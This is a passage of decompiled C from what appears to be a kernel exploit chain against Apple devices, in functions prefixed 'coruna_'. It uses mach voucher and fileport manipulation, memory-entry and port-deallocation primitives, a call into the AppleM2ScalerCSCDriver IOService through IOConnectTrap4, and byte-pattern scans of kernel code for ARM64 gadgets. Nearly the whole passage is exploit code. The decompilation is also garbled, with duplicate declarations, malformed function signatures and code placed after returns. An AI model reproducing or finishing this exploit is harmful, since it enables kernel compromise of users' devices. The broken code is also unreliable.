      err = coruna_host_create_mach_voucher(size,handle,lpm8);
      if (err != 1) goto fail;
      u = _fileport_makefd(*lpm8);
      *buf = u;
      _mach_port_deallocate(*(ipc_space_t *)ptr,*lpm8);
      *lpm8 = 0;
      if ((int)*buf < 0) goto fail;
      handle = handle + 1;
      lpm8 = lpm8 + 1;
      buf = buf + 1;
      off = off + -1;
    } while (off != 0);
    err = coruna_call_fcntl(thread_attr);
    if (err == 0) {
      size[0x64c] = thread_attr[0];
      size[0x64d] = thread_attr[1];
      if ((*(unsigned long *)(size + 0x56) < 0x1c1b0a80100000) ||
         (((*size & 0x5584001) == 0 && (*(unsigned long *)(size + 0x56) < 0x1f530000000000)))) {
        *(uint64_t *)(size + 0x64e) = host_info;
      }
      else {
        size[0x650] = (uint)host_info;
      }
      err = _fstat(thread_attr[1],&scratch);
      if (err == 0) {
        addr = coruna_ptr_canonicalize(size,scratch.st_atimespec.tv_sec);
        if (addr != 0) {
          *(__darwin_time_t *)(size + 0x674) = scratch.st_atimespec.tv_sec;
        }
        if ((*(unsigned long *)(size + 0x56) < 0x1c1b0a80100000) ||
           (((*size & 0x5584001) == 0 && (*(unsigned long *)(size + 0x56) < 0x1f530000000000)))) {
          if ((scratch.st_atimespec.tv_nsec != 0) &&
             ((*(unsigned long *)(size + 0x62) & scratch.st_atimespec.tv_nsec) == 0)) {
            *(long *)(size + 0x678) = scratch.st_atimespec.tv_nsec;
          }
        }
        else {
          size = scratch.st_atimespec.tv_nsec | 0xffffff0000000000;
          addr = coruna_ptr_canonicalize(size,size);
          if (addr != 0) {
            *(unsigned long *)(size + 0x86) = size;
          }
          size = ((unsigned long)scratch.st_atimespec.tv_nsec >> 0x28) * (unsigned long)size[0x60];
          if ((size != 0) && ((*(unsigned long *)(size + 0x62) & size) == 0)) {
            *(unsigned long *)(size + 0x678) = size;
          }
          if ((((size[0x64c] != 0xffffffff) && (size[0x64d] != 0xffffffff)) &&
              (size[0x650] != 0xffffffff)) &&
             (((*(long *)(size + 0x86) != 0 && (0x1c1b19145fffff < *(unsigned long *)(size + 0x56)))
              && (err = coruna_kernel600c_via_mach_port_deallocate_137e4(size), err == 0)))) {
            port = *(uint64_t *)(*(long *)(size + 0x46) + 0x100);
            addr = coruna_ptr_canonicalize(size,port);
            if (addr != 0) {
              *(uint64_t *)(size + 0x88) = port;
            }
          }
        }
      }
      coruna_fd_drain(size + 0x64c);
      size = coruna_close(bootargs);
      version = 1;
      *size_x = version;
      if (*(long *)k_kernel_stack_chk_guard_slot != action) {
      ___stack_chk_fail(size);
      }
      return 1;
    }
fail:
    coruna_close(bootargs);
  }
  buf = thread_attr;
  do {
    u = *buf;
    if (u != 0xffffffff) {
      u = _close(u);
    }
    size = (unsigned long)u;
    buf = buf + 1;
    addr = addr + -1;
  } while (addr != 0);
  version = 0;
done:
  *size_x = version;
  if (*(long *)k_kernel_stack_chk_guard_slot != action) {
    ___stack_chk_fail(size);
  }
  return 1;
}





void coruna_mach_port_deallocate_13c5c(long handle,uint32_t *size)
{
  long *ptr;
  mach_port_name_t name;
  uint8_t *ptr;
  bool err;
  int err;
  uint u;
  kern_return_t lk6;
  unsigned long size;
  mach_port_name_t *lpm8;
  unsigned long size;
  uint32_t version;
  mach_port_name_t *lpm10;
  uint64_t port;
  long handle;
  vm_inherit_t in_stack_ffffffffffffff70;
  uint32_t scratch;
  uint64_t *bootargs;
  vm_address_t thread_attr [3];
  mem_entry_name_port_t host_info [4];
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  host_info[2] = 0;
  host_info[0] = 0;
  host_info[1] = 0;
  thread_attr[0] = 0;
  size = *(unsigned long *)k_kernel_vm_page_size_slot;
  bootargs = (uint64_t *)0x0;
  scratch = 0xffffffff;
  err = coruna_open_dev_null(&scratch);
  ptr = k_kernel_mach_task_self_slot;
  size = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
  return;
  }
  ___stack_chk_fail(size);
}





uint64_t coruna_mach_port_deallocate_13f8c(long handle,mach_port_name_t *arg,uint64_t val)
{
  int err;
  kern_return_t lk2;
  long handle;
  uint64_t u;
  long addr;
  long off;
  uint scratch;
  uint8_t bootargs[4];
  long thread_attr;
  
  err = *(int *)(handle + 0x140);
  off = 0x38;
  if (err < 0x1f53) {
    if (err != 0x1809 && err != 0x1c1b) {
      return 0;
    }
  }
  else if (1 < err - 0x1f53U) {
    if (err != 0x2258) {
      return 0;
    }
    off = 0x30;
  }
  handle = coruna_ret_stub_2(handle,*arg);
  if (handle == 0) {
    return 0;
  }
  u = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,handle,&scratch);
  if ((int)u == 0) {
    return u;
  }
  if ((scratch & 0x3ff) == 0x25) {
    addr = coruna_return_zero_28118(handle,handle);
    if (addr == 0) {
      return 0;
    }
    err = coruna_kernel600c_residual_228(handle,addr + off,&thread_attr);
    if (err == 0) {
      return 0;
    }
    if (handle != thread_attr) {
      return 0;
    }
    u = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,addr + 8,bootargs);
    if ((int)u == 0) {
      return u;
    }
    u = coruna_mach_vm_machine_attribute(handle,addr + 8,0xffff);
    if ((int)u == 0) {
      return u;
    }
    lk2 = _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,*arg);
    if (lk2 == 0) {
      *arg = 0;
      handle = coruna_ret_stub_2(handle,val);
      if (handle == 0) {
        return 0;
      }
      u = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(handle,addr + off,handle);
      if ((int)u == 0) {
        return u;
      }
      coruna_kernel600c_via_kernel600c_via_call_mach_vm_machine_attribute_29df8_1e994_2(handle,handle);
      return 1;
    }
  }
  return 0;
}





uint8_t * coruna_mach_port_deallocate_14118(long handle,unsigned long arg,uint64_t val)
{
  int err;
  uint u;
  mach_port_name_t *lpm3;
  long handle;
  uint8_t *ptr;
  uint64_t size;
  long scratch;
  mach_port_name_t bootargs;
  
  bootargs = 0;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    err = coruna_host_create_mach_voucher(handle,(arg & 0xffffffff) + 0x1122334455667788,&bootargs);
    if ((err == 0) || (err = coruna_mach_port_deallocate_13f8c(handle,&bootargs,val), err == 0))
    ptr = &k_kernel_slot_1001;
    if (1 < bootargs + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
    }
    return ptr;
  }
  else {
    scratch = 0;
    lpm3 = (mach_port_name_t *)coruna_kernel600c_via_task_info(handle,arg);
    if (lpm3 == (mach_port_name_t *)0x0) {
fail:
      ptr = &k_kernel_slot_1001;
      if (1 < bootargs + 1) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
      }
      return ptr;
    }
    handle = coruna_ret_stub_2(handle,val);
    if (handle == 0) {
      ptr = (uint8_t *)0x2800e;
      if (1 < bootargs + 1) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
      }
      return ptr;
    }
    ptr = (uint8_t *)coruna_kernel600c_via_kernel600c_via_call_mach_vm_machine_attribute_29df8_1e994_2(handle,handle);
    if (1 < bootargs + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
    }
    return ptr;
  }
  ptr = (uint8_t *)0x0;
done:
  if (1 < bootargs + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
  }
  return ptr;
}





void coruna_mach_port_insert_right(int flags)
{
  uint name;
  uint8_t *ptr;
  kern_return_t lk2;
  mach_port_name_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  lk2 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch);
  if (lk2 == 0) {
    name = flags << 8 | 3;
    lk2 = _mach_port_insert_right(*(ipc_space_t *)ptr,name,scratch,0x15);
    if (lk2 == 0) {
      _mach_port_deallocate(*(ipc_space_t *)ptr,name);
    }
  }
  if (1 < scratch + 1) {
    _mach_port_mod_refs(*(ipc_space_t *)ptr,scratch,1,-1);
  }
  return;
}





unsigned long coruna_mach_make_memory_entry(uint64_t arg,uint64_t val,size_t n,vm_offset_t m,
                  vm_address_t *p)
{
  uint8_t *data;
  bool err;
  uint u;
  unsigned long size;
  vm_inherit_t in_stack_ffffffffffffff90;
  size_t cache_21;
  mem_entry_name_port_t cache_34;
  vm_offset_t scratch;
  
  data = k_kernel_mach_task_self_slot;
  cache_34 = 0;
  err = m == 0;
  cache_21 = n;
  scratch = m;
  if ((m == 0) &&
     (u = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,n,1),
     u != 0)) {
    err = false;
    size = (unsigned long)(u | 0x80000000);
    if (1 < cache_34 + 1) {
    _mach_port_deallocate(*(ipc_space_t *)data,cache_34);
    }
    if (err) {
    _vm_deallocate(*(vm_map_t *)data,scratch,n);
    }
    return size;
  }
  u = _mach_make_memory_entry(*(vm_map_t *)data,&cache_21,scratch,3,&cache_34,0);
  if (u != 0) {
    size = (unsigned long)(u | 0x80000000);
  }
  else if (cache_21 == n) {
      size = coruna_mach_port_deallocate_14118(arg,val,cache_34);
      if (((int)size == 0) && (m == 0)) {
        u = _vm_map(*(vm_map_t *)data,p,n,0,1,cache_34,0,0,3,2,
                        in_stack_ffffffffffffff90);
        if (u == 0) {
          _bzero((void *)*p,n);
          size = 0;
          if (1 < cache_34 + 1) {
          _mach_port_deallocate(*(ipc_space_t *)data,cache_34);
          }
          if (err) {
          _vm_deallocate(*(vm_map_t *)data,scratch,n);
          }
          return size;
        }
        size = (unsigned long)(u | 0x80000000);
      }
  }
  else {
      size = 0xad022;
  }
  if (((int)size != 0 && m == 0) && (*p != 0)) {
    _vm_deallocate(*(vm_map_t *)data,*p,n);
  }
  if (1 < cache_34 + 1) {
    _mach_port_deallocate(*(ipc_space_t *)data,cache_34);
  }
  if (err) {
    _vm_deallocate(*(vm_map_t *)data,scratch,n);
  }
  return size;
}





void coruna_kernel09_via_mach_make_memory_entry(long handle)
{
  uint8_t *ptr;
  int err;
  uint64_t u;
  uint64_t scratch;
  
  ptr = k_kernel_vm_page_size_slot;
  scratch = 0;
  err = coruna_mach_make_memory_entry((int)handle,0x10,*(uint64_t *)k_kernel_vm_page_size_slot,0,&scratch);
  if (err == 0) {
    u = *(uint64_t *)ptr;
    *(uint64_t *)(handle + 0x118) = scratch;
    *(uint64_t *)(handle + 0x120) = u;
  }
  return;
}





void coruna_mach_port_deallocate_14774(uint *size)
{
  uint8_t *ptr;
  int err;
  uint64_t u;
  long handle;
  unsigned long size;
  uint version;
  long addr;
  long off;
  long base;
  long scratch;
  mach_port_name_t bootargs;
  uint thread_attr;
  uint host_info [4];
  uint32_t serial_buf[4];
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  off = 0x1122334455667788;
  u = coruna_host_create_mach_voucher(size,0x1122334455667788,serial_buf);
  if ((((int)u != 0) && (handle = coruna_ret_stub_2(size,serial_buf[0]), u = 0, handle != 0)) &&
     (u = coruna_kernel600c_via_kernel600c_via_fd_read_full(size,handle,&thread_attr), ptr = k_kernel_mach_task_self_slot,
     (int)u != 0)) {
    if ((thread_attr & 0x3ff) != 0x22) {
      u = 0;
      host_info[0] = size[0x64c];
      host_info[1] = size[0x64d];
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(u);
    }
    u = 1;
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return;
  }
  ___stack_chk_fail(u);
}





void coruna_mach_make_memory_entry_14a04(long handle)
{
  uint8_t *ptr;
  kern_return_t lk2;
  uint u;
  int err;
  mach_port_name_t *lpm5;
  unsigned long size;
  mach_port_name_t *lpm7;
  long handle;
  size_t size;
  long addr;
  vm_inherit_t in_stack_ffffffffffffff60;
  mach_port_name_t lm10;
  mem_entry_name_port_t scratch;
  uint64_t *bootargs;
  size_t thread_attr;
  uint host_info;
  mach_port_name_t serial_buf [5];
  mem_entry_name_port_t action;
  long block_ctx;
  
  block_ctx = *(long *)k_kernel_stack_chk_guard_slot;
  size = *(size_t *)k_kernel_vm_page_size_slot;
  bootargs = (uint64_t *)0x0;
  thread_attr = size;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    serial_buf[3] = 0;
    size = coruna_host_create_mach_voucher(handle,0x3122334455667788,serial_buf + 3);
    lm10 = serial_buf[3];
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
    }
    return;
  }
  else {
    lpm5 = (mach_port_name_t *)coruna_kernel600c_via_task_info(handle,0);
    size = 0;
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
    }
    return;
  }
  serial_buf[0] = lm10;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    addr = coruna_ret_stub_2(handle);
    size = 0;
    if ((addr == 0) || (size = coruna_kernel600c_via_kernel600c_via_fd_read_full(handle,addr,&host_info), (int)size == 0))
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
    }
    return;
  }
  else if (lm10 + 1 < 2) {
done:
    ptr = k_kernel_mach_task_self_slot;
    err = *(int *)(handle + 0xe8);
    if (((((err + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
         (*(long *)(handle + 0x100) == 0)) ||
        ((lm10 = *(mach_port_name_t *)(handle + 0x114), lm10 + 1 < 2 ||
         (serial_buf[3] = lm10, serial_buf[4] = err, *(long *)(&k_kernel_slot_19d0 + handle) == 0)))) ||
       (*(long *)(handle + 0xf0) == 0)) {
cleanup:
      size = 0;
    }
    else {
      lk2 = _mach_make_memory_entry
                        (*(vm_map_t *)k_kernel_mach_task_self_slot,&thread_attr,0,0x20003,&scratch,0
                        );
      size = 0;
      if (lk2 == 0) {
        action = scratch;
        lk2 = _vm_map(*(vm_map_t *)ptr,(vm_address_t *)&bootargs,size,0,1,scratch,0,0,3,2,
                        in_stack_ffffffffffffff60);
        size = 0;
        if (lk2 == 0) {
          _bzero(bootargs,size);
          *bootargs = *(uint64_t *)(&k_kernel_slot_19d0 + handle);
          bootargs[1] = *(uint64_t *)(handle + 0xf0);
          *(int *)(bootargs + 2) = (int)*(uint64_t *)(handle + 0x108);
          *(uint32_t *)((long)bootargs + 0x14) = *(uint32_t *)(handle + 0x110);
          u = _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)bootargs,size);
          size = (unsigned long)u;
          addr = 0;
          lpm5 = serial_buf;
          do {
            if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
              lm10 = 0;
              size = coruna_host_create_mach_voucher(handle,addr + 0x3122334455667788,&ghidra_stack_0);
              if ((int)size == 0) break;
              *lpm5 = lm10;
              size = coruna_mach_port_deallocate_13f8c(handle,lpm5,serial_buf[addr + 3]);
              if ((int)size == 0) break;
            }
            else {
              lpm7 = (mach_port_name_t *)coruna_kernel600c_via_task_info(size,addr);
              size = 0;
              if (lpm7 == (mach_port_name_t *)0x0) break;
              lm10 = serial_buf[addr + 3];
              handle = coruna_ret_stub_2(handle,lm10);
              size = 0;
              if (handle == 0) break;
              err = coruna_kernel600c_via_kernel600c_via_call_mach_vm_machine_attribute_29df8_1e994_2(handle,handle);
              if ((err != 0) ||
                 (lk2 = _mach_port_mod_refs(*(ipc_space_t *)ptr,lm10,0,0xffff), lk2 != 0))
              goto cleanup;
              *lpm7 = lm10;
            }
            addr = addr + 1;
            lpm5 = lpm5 + 1;
            size = 1;
          } while (addr != 3);
        }
      }
    }
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
    }
    return;
  }
  size = 1;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
  }
  return;
}





uint64_t
void coruna_open_m2scaler_14cf0(uint64_t val,uint64_t id_2,long handle,uint64_t size_3,
            uint64_t off_4,uint64_t off_5,unsigned long *arg)
{
  long handle;
  uint u;
  uint size;
  int err;
  long addr;
  long off;
  uint64_t version;
  uint64_t port;
  long base;
  unsigned long tag;
  uint8_t version[16];
  int scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint64_t host_info;
  int serial_buf;
  uint64_t action;
  uint64_t bootargs;
  uint64_t block_ctx;
  long stack_guard;
  
  version = (*(void (*)k_kernel_chkstk_darwin_slot)();
  addr = version;
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  serial_buf = 0;
  bootargs = 0;
  u = *(uint *)(addr + 0x180);
  size = 0;
  if (u != 0) {
    size = 0x1000 / u;
  }
  err = 0x1000 - size * u;
  scratch = 0x1000;
  if (err != 0) {
    scratch = (u - err) + 0x1000;
  }
  if (*(long *)(addr + 0x200) == 0) {
    coruna_macho_text_sect(&action,*(uint64_t *)(&k_kernel_slot_19f8 + addr));
    scratch = bootargs;
    thread_attr = action;
    host_info = block_ctx;
    off = coruna_strsep(&action,"00 00 01 91 C0 03 5F D6",0,0);
    if (off == 0) {
      version = 0;
      if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
      return version;
      }
      ___stack_chk_fail();
    }
    *(long *)(addr + 0x200) = off;
  }
  version = _IOServiceMatching("AppleM2ScalerCSCDriver");
  port = _IOServiceGetMatchingService(*(uint32_t *)k_kernel_kiomasterportdefault_slot,version);
  u = (int)port + 1;
  if (u < 2) {
done:
    version = 0;
  }
  else {
    err = _IOServiceOpen(port,*(uint32_t *)k_kernel_mach_task_self_slot,0,&serial_buf);
    version = 0;
    if (err == 0) {
      if (serial_buf + 1U < 2) goto done;
      off = coruna_kernel600c_via_return_zero_28118(addr);
      version = 0;
      if (1 < serial_buf + 1U) {
      _IOServiceClose();
      }
      if (1 < u) {
      _IOObjectRelease(port);
      }
      if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
      return version;
      }
      ___stack_chk_fail();
      err = coruna_kernel600c_residual_228(addr,off,&bootargs);
      if (((err == 0) || (base = coruna_ptr_canonicalize(addr,bootargs), base == 0)) ||
         (base = coruna_mach_port_request_notification_2c77c(addr,&scratch), base == 0)) goto done;
      err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(addr,bootargs,0x1000,&action);
      if ((err == 0) || (err = coruna_call_mach_vm_machine_attribute_29df8_1e994(addr,base,&action,0x1000), err == 0)) {
check_ok:
        version = 0;
      }
      else {
        handle = 0x5c0;
        if (*(int *)(addr + 0x140) < 0x1809) {
          handle = 0x5b8;
        }
        err = coruna_call_mach_vm_machine_attribute_29df8_1e8e0(addr,handle + base,*(uint64_t *)(addr + 0x200));
        if (err == 0) goto check_ok;
        coruna_call_mach_vm_machine_attribute_29df8_1e8e0(addr,off,base);
        coruna_call_mach_vm_machine_attribute_29df8_1e8e0(addr,off + 0x40,8);
        coruna_call_mach_vm_machine_attribute_29df8_1e8e0(addr,off + 0x48,version);
        coruna_call_mach_vm_machine_attribute_29df8_1e8e0(addr,off + 0x50,handle * 2 + -0x10);
        tag = _IOConnectTrap4(serial_buf,0,size_3,off_4,off_5,0);
        coruna_call_mach_vm_machine_attribute_29df8_1e8e0(addr,off + 0x40,0);
        coruna_call_mach_vm_machine_attribute_29df8_1e8e0(addr,off + 0x48,0);
        coruna_call_mach_vm_machine_attribute_29df8_1e8e0(addr,off + 0x50,0);
        coruna_call_mach_vm_machine_attribute_29df8_1e8e0(addr,off,bootargs);
        if (arg != (unsigned long *)0x0) {
          *arg = tag & 0xffffffff;
        }
        version = 1;
      }
      coruna_mach_port_allocate(addr,base,scratch);
    }
  }
cleanup:
  if (1 < serial_buf + 1U) {
    _IOServiceClose();
  }
  if (1 < u) {
    _IOObjectRelease(port);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
    return version;
  }
  ___stack_chk_fail();
}





void coruna_strsep(uint64_t *val,char *path,uint32_t size,uint32_t flags_2)
{
  int err;
  char *ptr;
  char *buf;
  long handle;
  uint64_t u;
  long addr;
  long off;
  char *scratch;
  uint64_t scratch;
  uint64_t bootargs;
  char *thread_attr;
  ushort host_info [128];
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  thread_attr = (char *)0x0;
  u = 0;
  if ((path != (char *)0x0) && (ptr = _strdup(path), ptr != (char *)0x0)) {
    addr = 0;
    off = 0;
    scratch = ptr;
    do {
      buf = _strsep(&scratch," ");
      err = _strcmp(buf,"-");
      handle = addr;
      if (err != 0) {
        err = _strcmp(buf,"+");
        if (err != 0) {
          err = _strcmp(buf,"..");
          if (err == 0) {
            host_info[addr] = 0xffff;
            if (addr < 0x7f) {
              addr = addr + 1;
              handle = off;
            }
          }
          else {
            handle = _strtol(buf,&thread_attr,0x10);
            host_info[addr] = (ushort)handle & 0xff;
            if (*thread_attr == '\0') {
              if (addr < 0x7f) {
                addr = addr + 1;
                handle = off;
              }
            }
            else {
              _free(ptr);
              u = 0;
              if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
                ___stack_chk_fail(u);
              }
              return;
            }
          }
        }
        else {
          handle = addr + 1;
        }
      }
      off = handle;
    } while (scratch != (char *)0x0);
    _free(ptr);
    scratch = val[1];
    scratch = (char *)*val;
    bootargs = val[2];
    u = coruna_kernel600c_via_cat(&scratch,host_info,addr,handle,size,flags_2);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
    ___stack_chk_fail(u);
  }
  return;
}





void coruna_kernel509_via_cat(long *handle,long addr_2,unsigned long arg,long off_3,int flags)
{
  unsigned long u;
  byte *ptr;
  int err;
  char err;
  ushort size;
  byte *buf;
  uint version;
  byte *str;
  byte err;
  long handle;
  char status;
  unsigned long port;
  byte *copy;
  short *lps14;
  byte *data;
  uint8_t port[16];
  long scratch;
  long bootargs;
  long thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t block_ctx;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t stack_guard;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t sa_saved;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t sa_new;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t path_buf;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  version = (uint)arg;
  err = (char)arg;
  if (((arg == (long)err) && (handle[2] != 0)) && (handle[1] != 0)) {
    port = arg;
    if (0 < (int)version) {
      u = ((unsigned long)-version | 0xffffffff00000000) + arg;
      handle = (arg & 0xffffffff) + 1;
      do {
        version = version - 1;
        port = arg;
        if (*(short *)(addr_2 + (unsigned long)version * 2) != -1) break;
        arg = arg - 1;
        handle = handle + -1;
        port = u;
      } while (1 < handle);
    }
    path_buf = coruna_cat(err,coruna_cat(err,coruna_cat(err,coruna_u64_pack14((err), (coruna_cat(err,coruna_cat(
                                                  err,coruna_cat(err,err))))))));
    cache_22 = coruna_cat(err,coruna_cat(err,coruna_cat(err,coruna_u64_pack14((err), (coruna_cat(err,coruna_cat(
                                                  err,coruna_cat(err,err))))))));
    cache_24 = cache_22;
    cache_23 = path_buf;
    cache = cache_22;
    sa_new = path_buf;
    cache_21 = cache_22;
    cache_20 = path_buf;
    json_buf = cache_22;
    sa_saved = path_buf;
    work = cache_22;
    frame = path_buf;
    region = cache_22;
    stack_guard = path_buf;
    url_buf = cache_22;
    plist = path_buf;
    sa_new = cache_22;
    block_ctx = path_buf;
    tmp_buf = cache_22;
    path_buf = path_buf;
    block_ctx = cache_22;
    action = path_buf;
    sa_saved = cache_22;
    stack_guard = path_buf;
    host_info = cache_22;
    serial_buf = path_buf;
    action = cache_22;
    serial_buf = path_buf;
    scratch = cache_22;
    host_info = path_buf;
    thread_attr = cache_22;
    bootargs = path_buf;
    if (1 < err) {
      err = 0;
      do {
        handle = (long)*(short *)(addr_2 + (long)(char)err * 2);
        status = ~err + err;
        if (handle == -1) {
          path_buf = coruna_cat(status,coruna_cat(status,coruna_cat(status,coruna_u64_pack14((status), (coruna_cat(status
                                                  ,coruna_cat(status,coruna_cat(status,status))))))));
          cache_22 = coruna_cat(status,coruna_cat(status,coruna_cat(status,coruna_u64_pack14((status), (coruna_cat(
                                                  status,coruna_cat(status,coruna_cat(status,status))))))
                                              ));
          cache_24 = cache_22;
          cache_23 = path_buf;
          cache = cache_22;
          sa_new = path_buf;
          cache_21 = cache_22;
          cache_20 = path_buf;
          json_buf = cache_22;
          sa_saved = path_buf;
          work = cache_22;
          frame = path_buf;
          region = cache_22;
          stack_guard = path_buf;
          url_buf = cache_22;
          plist = path_buf;
          sa_new = cache_22;
          block_ctx = path_buf;
          tmp_buf = cache_22;
          path_buf = path_buf;
          block_ctx = cache_22;
          action = path_buf;
          sa_saved = cache_22;
          stack_guard = path_buf;
          host_info = cache_22;
          serial_buf = path_buf;
          action = cache_22;
          serial_buf = path_buf;
          scratch = cache_22;
          host_info = path_buf;
          thread_attr = cache_22;
          bootargs = path_buf;
        }
        else {
          *(char *)((long)&host_info + handle) = status;
        }
        err = err + 1;
      } while ((int)(char)err < err + -1);
    }
    lps14 = (short *)(addr_2 + port * 2 + -2);
    handle = (long)*lps14;
    err = *(char *)((long)&host_info + handle);
    *(uint8_t *)((long)&host_info + handle) = 0;
    bootargs = handle[1];
    scratch = *handle;
    thread_attr = handle[2];
    port = coruna_ioservice_open_path(&scratch,1);
    handle = port;
    buf = (byte *)0x0;
    if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
    ___stack_chk_fail(buf);
    }
    return;
  }
done:
  buf = (byte *)0x0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
    ___stack_chk_fail(buf);
  }
  return;
}





uint64_t coruna_kernel600c_via_kernel509_via_cat(uint64_t *val,char *path,uint64_t id_2,unsigned long arg)
{
  long handle;
  bool err;
  size_t ls3;
  uint16_t *ptr;
  uint64_t u;
  unsigned long size;
  unsigned long version;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  ls3 = _strlen(path);
  ptr = _malloc((ls3 + 2) * 2);
  if (ptr == (uint16_t *)0x0) {
    u = 0;
  }
  else {
    ptr[ls3 + 1] = 0;
    *ptr = 0;
    if (ls3 != 0) {
      size = 0;
      version = 1;
      do {
        ptr[version] = (ushort)(byte)path[size];
        err = version < ls3;
        size = version;
        version = (unsigned long)((int)version + 1);
      } while (err);
    }
    err = (arg & 0x20) != 0;
    handle = ls3 + 1;
    if (err) {
      handle = ls3 + 2;
    }
    scratch = val[1];
    scratch = *val;
    bootargs = val[2];
    u = coruna_kernel509_via_cat(&scratch,ptr + (((uint)arg & 0x20) >> 5 ^ 1),handle,err,id_2,
                         arg);
    _free(ptr);
  }
  return u;
}





long coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8(long *handle,uint64_t val,int flags)
{
  unsigned long u;
  int err;
  unsigned long size;
  void *ptr;
  unsigned long version;
  uint8_t u[16];
  long scratch;
  long bootargs;
  long thread_attr;
  uint64_t scratch;
  unsigned long port;
  
  bootargs = handle[1];
  scratch = *handle;
  thread_attr = handle[2];
  scratch = val;
  u = coruna_ioservice_open_path(&scratch,1);
  port = u;
  if ((port != 0) && (u != 0)) {
    u = port + u;
    size = (unsigned long)*(byte *)(*handle + 0x34);
    if (port + size <= u) {
      version = port;
      do {
        ptr = u;
        if ((flags == 0) || ((version & (long)(flags + -1)) == 0)) {
          coruna_call_mach_vm_machine_attribute_29df8(*handle,ptr,size,u);
          err = _memcmp(ptr,&scratch,size);
          if (err == 0) {
            return (handle[1] - port) + version;
          }
        }
        version = version + 1;
        u = u + -1;
        u = (long)ptr + 1;
      } while ((long)ptr + 1 + size <= u);
    }
  }
  return 0;
}





void coruna_macho_cstring(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  long handle;
  uint8_t scratch[24];
  uint8_t bootargs[24];
  
  coruna_macho_map_segsect(bootargs,handle,"__TEXT","__cstring");
  handle = coruna_kernel600c_via_kernel509_via_cat(bootargs,size_3,0,0x21);
  if (handle != 0) {
    coruna_macho_map_segsect(scratch,handle,val,id_2);
    coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8(scratch,handle,*(uint8_t *)(handle + 0x34),1);
  }
  return;
}





void coruna_kernel600c_str_01_8b_88_d0_38_d5_e8_00_00_b5(long handle)
{
  char *ptr;
  char *buf;
  int err;
  uint u;
  long handle;
  long addr;
  unsigned long size;
  uint8_t scratch[24];
  uint8_t bootargs[24];
  uint8_t thread_attr[24];
  
  err = coruna_ctx_test_flag(*(uint64_t *)(handle + 0x118),8);
  if (err == 0) {
    if ((*(unsigned long *)(handle + 0x88) < 0x22581401900000) ||
       (err = coruna_ctx_test_flag(*(uint64_t *)(handle + 0x118),0x2000), err != 0)) {
      u = coruna_iosurface_gen_index(handle);
      coruna_macho_text_sect(scratch,handle);
      ptr = ".. 01 .. 8B 88 D0 38 D5 E8 00 00 B5";
      if (u != 1) {
        ptr = (char *)0x0;
      }
      buf = "6B FD 62 D3 7F 19 00 F1 .. .. .. 54";
      if (u < 2) {
        buf = ptr;
      }
      ptr = ".. FD .. D3 .. .. 00 F1 .. .. .. 54";
      if (u < 5) {
        ptr = buf;
      }
      addr = coruna_strsep(scratch,ptr,0,1);
      handle = 0xc;
